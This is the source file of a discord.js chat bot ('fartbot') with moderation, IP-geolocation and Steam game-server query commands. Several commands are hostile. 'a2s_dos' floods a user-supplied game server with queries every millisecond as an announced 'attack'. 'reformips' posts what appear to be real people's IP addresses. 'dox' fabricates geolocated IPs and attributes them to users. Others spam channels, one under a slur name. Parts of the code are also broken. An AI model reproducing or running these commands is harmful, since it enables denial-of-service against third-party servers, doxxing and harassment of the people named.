const {Client,Events, GatewayIntentBits, MessageEmbed,PermissionsBitField, TextChannel,MessageCollector, Collection} = require("discord.js");
const {
	joinVoiceChannel,
	createAudioPlayer,
	createAudioResource,
	entersState,
	StreamType,
	AudioPlayerStatus,
	VoiceConnectionStatus,
} = require('@discordjs/voice')
const fileSystem = require("fs");
var geoip = require("geoip-lite");
var geocoder = require('local-reverse-geocoder');
const {queryGameServerPlayer,queryGameServerInfo,queryMasterServer,REGIONS} = require('steam-server-query');
const path = require('path')

const client = new Client({
    intents: [GatewayIntentBits.GuildMessages]
});
client.commands = new Collection();
const commandsPath = path.join(__dirname,'commands');
const commandFiles = fileSystem.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

//boilerplate
for(const file of commandFiles) {
    const filePath = path.join(commandsPath,file);
    const command = require(filePath);
    if('data' in command && 'execute' in command) {
        client.commands.set(command.data.name, command);
    } else {
        console.log(`Invalid command! ${filepath} is missing require 'data' or 'execute' property`);
    }
}

var fartid = 872543618391490560;
client.on("ready", () => {
    console.log("fartbot activated");
});

const dashanid = 476979646639112193;
var banidlist = ["872543618391490560","514259663278178314","923378656125001738"]
    //var banidlist = ["820463735629545503"];
var demotelist = ["533898212214571024", "142051886751547393", "451223974781779969"]
    //var demotelist = ["820463735629545503"];
const ownerid = 849053208911282198
var fartbots = ["514259663278178314","772589373685760041"]
function getIDFromMention(mention) {
    if (!mention) return;

    if (mention.startsWith('<@') && mention.endsWith('>')) {
        mention = mention.slice(2, -1);

        if (mention.startsWith('!')) {
            mention = mention.slice(1);
        }
        return mention;
    }
}
var a2s_target;
var timer = 0
var time = 60
function a2s_dos() {
    if (timer / 1000 > time) { end_dos() }
    if (a2s_target!=undefined) {
    console.log("firing")
    timer++
    queryGameServerInfo(a2s_target).then(response => {
        console.log(response.name)    
    })
    .catch(e => {
        console.error(e)
    })
    }
}
function end_dos() {
    clearInterval(a2s_dos_var)
    console.log("a2s_dos ended")
}
const player = createAudioPlayer();
function playSound(link) {
	const resource = createAudioResource(link, {
		inputType: StreamType.Arbitrary,
	});

	player.play(resource);

	return entersState(player, AudioPlayerStatus.Playing, 5e3);
}


client.on(Events.InteractionCreate, interaction => {
    console.log(interaction);
})

client.on("messageCreate", (message) => {
    message.guild.members.fetch(client.user.id)
    .then(self => {
        var sbot = self
    })
    
    args = message.content.substring(1).split(' ');
    cmd = args[0]
    if (message.content.substring(0, 1) === "^") {
        
        if (message.author.id == fartid) {
            var server = message.guild;
            switch (cmd) {
                case "hello":
                    message.channel.send("hello fartburger");
                    break;          
            }
        }
            var server = message.guild;
            switch (cmd) {
                case "help":
                    message.channel.send(` \`\`\`prefix: '^' (not changeable)
arguments specified in <> are required
current commands available:
help: this. prints help message
dox <mentioned target>: generates a random ip address (might not even be valid sometimes) of user mentioned.
iplookup <ip address>: self-explanatory, gets information about an ip address.
analytics: provides statitics from bot command usage and uptime
serverinfo <server ip and port (x.x.x.x:port)>: gets information about the valve server with given ip
playerinfo <server ip and port (x.x.x.x:port)>: gets a list of players on the valve server with given ip
findserverfromip <name> <OPTIONAL timeout (in seconds, default 10 seconds)> <OPTIONAL game type> <OPTIONAL map>: finds a list of server ips with given parameters.

there will be more commands added, and suggestions are also appreciated\`\`\`
                    `);
                    break;
                case "pledge":
                    for (let x = 0; x < 30; x++) {
                        message.channel.send("i pledge allegiance to the bag https://cdn.discordapp.com/attachments/849050329907068944/923090276950618152/ethan.png");
                    }
                    break;
                case "nignig":
                    for (let x = 0; x < 10; x++) {
                        message.channel.send("https://cdn.discordapp.com/attachments/880493470245077073/923819713174331392/nignig.gif");
                    }
                    break;

                case "ban":
                    if(message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
                    
                    var banusr = args[1];
                    if (args[2]) {
                        var reason = "";
                        var aiterator=0
                        args.forEach(item => {
                            if(aiterator<=1) {
                            aiterator++
                            } else {
                                reason = reason.concat(" ",item);
                            }
                        });
                    }
                    var data = fileSystem.readFileSync('analytics.json');
                    var jdata = JSON.parse(data)
                    jdata.bans++;
                    var sjdata = JSON.stringify(jdata)
                    fileSystem.writeFileSync("analytics.json",sjdata)
                    var buser = message.mentions.users.first();
                    console.log(buser)
                    if(!buser) {
                        message.channel.send("User not found")
                        return
                    } 
                    message.guild.bans.create(buser, { reason: reason})
                    .then(msg => {
                        const bembed = new MessageEmbed()
                        .setTitle('User has been banned.')
                        .setColor('#624002')
                        .setThumbnail(buser.displayAvatarURL())
                        .addField('User: ',buser.username)
                        .addField('Banned by: ',message.author.username)
                        .addField('Reason: ', reason ? reason : "None given.")
                        message.channel.send({embeds:[bembed]});
                    })
                    .catch(message.channel.send("Failed to ban user"))
                    }
                    break;
                    case "kick":
                        if(message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
                        
                        var kickusr = args[1];
                        if (args[2]) {
                            var kreason = "";
                            var aiterator=0
                            args.forEach(item => {
                                if(aiterator<=1) {
                                aiterator++
                                } else {
                                    kreason = kreason.concat(" ",item);
                                }
                            });
                        }
                        var data = fileSystem.readFileSync('analytics.json');
                        var jdata = JSON.parse(data)
                        jdata.kicks++;
                        var sjdata = JSON.stringify(jdata)
                        fileSystem.writeFileSync("analytics.json",sjdata)
                        message.guild.members.fetch(getIDFromMention(args[1]))
                            .then(user => {
                                //if (message.author.id==fartid.toString()) {
                                if (user.id!=client.id) {
                                const kickembed = new MessageEmbed()
                                .setTitle('User has been kicked.')
                                .setColor('#624002')
                                .setThumbnail(user.displayAvatarURL())
                                .addField('User: ',user.user.username)
                                .addField('Banned by: ',message.author.username)
                                .addField('Reason: ', reason ? reason : "None given.")
                                message.channel.send({embeds:[kickembed]});
                                var msgreason = reason ? reason : "None";
                                server.members.kick(user.user)
                                .then(console.log("successfully kicked user"))
                                .catch(console.error);
                                }
                                //}
                            })
                            .catch(console.error);
                        }
                        break;
                    case 'striproles':
                        if (message.member.permissions.has(PermissionsBitField.Flags.ManageRoles) || message.member.user.id == fartid) {
                        message.guild.members.fetch(getIDFromMention(args[1]))
                        .then(user => {
                            user.roles.remove(user.roles.cache)
                            .then(message.delete()
                            .then()
                            .catch(console.error)
                            )
                        });
                    }
                    break;
                    case "dox":
                        if (getIDFromMention(args[1])===fartid) {
                            break;
                        }
                        var data = fileSystem.readFileSync('analytics.json');
                        var jdata = JSON.parse(data)
                        jdata.doxxes++;
                        var sjdata = JSON.stringify(jdata)
                        fileSystem.writeFileSync("analytics.json",sjdata)
                        var fakeip = Math.floor((Math.random() * (255 - 192 + 1) + 192)).toString() + "." + Math.floor((Math.random() * (195 - 20 + 1) + 20)).toString() + "." + Math.floor((Math.random() * (145 - 45 + 1) + 45).toString()) + "." + Math.floor((Math.random() * (20 - 60 + 1) + 60)).toString()
                        var geo = geoip.lookup(fakeip);
                        console.log(geo===null)
                        do {
                        fakeip = Math.floor((Math.random() * (255 - 192 + 1) + 192)).toString() + "." + Math.floor((Math.random() * (195 - 20 + 1) + 20)).toString() + "." + Math.floor((Math.random() * (145 - 45 + 1) + 45).toString()) + "." + Math.floor((Math.random() * (20 - 60 + 1) + 60)).toString()
                        geo = geoip.lookup(fakeip);
                        // wtf lol
                        if(geo!=null&geo!=undefined) {
                            if(geo.city.length===0) {
                                console.log('try again')
                                fakeip = Math.floor((Math.random() * (255 - 192 + 1) + 192)).toString() + "." + Math.floor((Math.random() * (195 - 20 + 1) + 20)).toString() + "." + Math.floor((Math.random() * (145 - 45 + 1) + 45).toString()) + "." + Math.floor((Math.random() * (20 - 60 + 1) + 60)).toString()
                                geo = geoip.lookup(fakeip);
                                if(geo!=null&geo!=undefined) {
                                    if(geo.city.length===0) {
                                        console.log('try again')
                                        fakeip = Math.floor((Math.random() * (255 - 192 + 1) + 192)).toString() + "." + Math.floor((Math.random() * (195 - 20 + 1) + 20)).toString() + "." + Math.floor((Math.random() * (145 - 45 + 1) + 45).toString()) + "." + Math.floor((Math.random() * (20 - 60 + 1) + 60)).toString()
                                        geo = geoip.lookup(fakeip);
                                        if(geo!=null&geo!=undefined) {
                                            if(geo.city.length===0) {
                                                console.log('try again')
                                                fakeip = Math.floor((Math.random() * (255 - 192 + 1) + 192)).toString() + "." + Math.floor((Math.random() * (195 - 20 + 1) + 20)).toString() + "." + Math.floor((Math.random() * (145 - 45 + 1) + 45).toString()) + "." + Math.floor((Math.random() * (20 - 60 + 1) + 60)).toString()
                                                geo = geoip.lookup(fakeip);
                                            }
                                        }
                                    }
                                }
                            }
                        }  
                    }
                    while(geo===null|geo===undefined) 
                    var lat = geo.ll[0];
                    var long = geo.ll[1];
                        message.guild.members.fetch(getIDFromMention(args[1]))
                            .then(user => {message.channel.send(user.user.username + "'s ip is: " +fakeip)
                            message.channel.send(`\`\`\`city: ${geo.city}
region: ${geo.region}
country: ${geo.country}
timezone: ${geo.timezone}
latitude/longitude: ${lat}, ${long}\`\`\``)
                        .then()
                        .catch(console=>{
                            message.channel.send("```Something went wrong. Make sure the ip address is valid and try again.```")
                        });
                })
                            .catch(console.error)
                        break;
                    case 'iplookup':
                        var geo2 = geoip.lookup(args[1]);
                        var lat2 = geo2.ll[0];
                        var long2 = geo2.ll[1];
                        if (geo2.city.length>0 & geo2.region.length>0) {
                        message.channel.send(`\`\`\`Info for ${args[1]}:
city: ${geo2.city}
region: ${geo2.region}
country: ${geo2.country}
timezone: ${geo2.timezone}
latitude/longitude: ${lat2}, ${long2}\`\`\``)
                        .then()
                        .catch(console=>{
                            message.channel.send("```Something went wrong. Make sure the ip address is valid and try again.```")
                        });
                    } else {
                        message.channel.send('\`\`\`Invalid IP Address\`\`\`')
                        .then()
                        .catch(console.error)
                    }
                    break;
                    case 'analytics':
                        var data = fileSystem.readFileSync('analytics.json');
                        var jdata = JSON.parse(data)
                        console.log(JSON.parse(data))
                        guildsCount = client.guilds.cache.size
                        timeOnline = ((client.uptime/1000)/60)>=60 ? Math.round((((client.uptime/1000)/60)/60)).toString()+" hour(s)" : Math.round(((client.uptime/1000)/60)).toString()+" minute(s)"
                        message.channel.send(`\`\`\`fartbot analytics:
guilds containing fartbot: ${guildsCount}
time online: ${timeOnline}
kicks issued by fartbot: ${jdata.kicks} 
bans issued by fartbot: ${jdata.bans} 
# of users doxxed by fartbot: ${jdata.doxxes} \`\`\``)
.then()
.catch(console.error)
                    break;   
                    case 'serverinfo':
                        reqServer = args[1];
                        queryGameServerInfo(args[1]).then(response => {
                            //console.log(response)
                            var infoEmbed = new MessageEmbed()
                            .setTitle("Information for server "+response.name)
                            .setColor("DARK_RED")
                            .addField("Game: ",response.game)
                            .addField("Map: ",response.map)
                            .addField("Anticheat installed?: ",response.vac.toString())
                            .addField("Playercount: ",response.players.toString())
                            message.channel.send({embeds:[infoEmbed]})
                        })
                        .catch(e => {
                            console.error(e)
                            message.channel.send(`Something went wrong. Please try again.
\`\`\`${e}\`\`\``)
                        })
                        break;
                        case 'playerinfo':
                        queryGameServerPlayer(args[1]).then(response => {
                            console.log(response)
                            var names = ""
                            //response.players.forEach(player => {
                                //names = names+player.name+"\n";
                            //})
                            var infoEmbed = new MessageEmbed()
                            .setTitle("Information for server "+response.name)
                            .setColor("DARK_RED")
                            .addField("Players: ",names)
                            message.channel.send({embeds:[infoEmbed]})
                        })
                        .catch(e => {
                            console.error(e)
                            message.channel.send(`Something went wrong. Please try again.
\`\`\`${e}\`\`\``)
                        })
                        break;
                        case 'findserveripfromname':
                            if(args[1]===null) {
                                break
                            }
                            var timeout = args[2]!=null ? parseInt(args[2])*1000 : 10*1000
                            var namefilter = args[1]
                            queryMasterServer('f',)
                            queryMasterServer('hl2master.steampowered.com:27011',REGIONS.ALL, {gamedir: "Garrysmod",name_match: [namefilter]},timeout)
                            .then(servers => {
                                message.channel.send(`found results:
\`\`\`${servers.toString()}\`\`\``)
                                console.log(servers)
                            })
                            .catch(err => {
                                console.log(err)
                                message.channel.send(`something went wrong, please try again. error:
\`\`\`${err}\`\`\``)
                            })
                            
                        break;

                        case 'superspam':
                            attachments = Array.prototype.slice.call(message.attachments,0)
                            msgtosend = message.content.substring(11)
                            for(let i=0;i<100;i++) {
                                message.channel.send({content:msgtosend,files: attachments})
                                .then()
                                .catch(console.error)
                            }
                        break;
                        case 'reformips':
                            message.channel.send(`\`\`\`coomers ip: 174.58.99.194
gins ip: 108.249.187.243
doubles ip: 47.200.243.62\`\`\``)
                            break;
                        case 'a2s_dos':
                            timer = 0
                            a2s_target = args[1]
                            message.channel.send(`Starting attack on ${args[1]}`)
                            var a2s_dos_var = setInterval(a2s_dos,1)
                            
                        break;

            }

        
    }
});

client.login(process.env.TOKEN);